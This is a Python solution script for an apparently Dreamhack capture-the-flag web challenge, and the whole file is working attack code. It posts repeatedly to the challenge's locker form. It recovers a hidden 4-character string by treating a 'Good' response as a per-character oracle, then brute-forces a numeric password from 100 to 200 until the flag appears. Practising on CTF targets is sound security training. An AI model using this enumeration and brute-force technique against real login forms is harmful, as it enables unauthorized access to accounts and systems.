import requests
import string

url = "http://host1.dreamhack.games:13097/"
charset = string.ascii_lowercase + string.digits

rand_str = ""
rand_num = ""

while True:
    for pos in range(4):
        for ch in charset:
            trial = rand_str + ch
            data = {"locker_num": trial, "password": ""}
            res = requests.post(url, data=data)
            if "Good" in res.text:
                rand_str += ch
                print(f"Found character: {ch}, Current rand_str: {rand_str}")
                break
    if len(rand_str) == 4:
        break
print(f"Discovered rand_str: {rand_str}")

for num in range(100, 201):
    data = {"locker_num": rand_str, "password": str(num)}
    res = requests.post(url, data=data)
    if "FLAG:" in res.text:
        print(f"Discovered rand_num: {num}")
        print("Flag found!")
        print(res.text)
        break
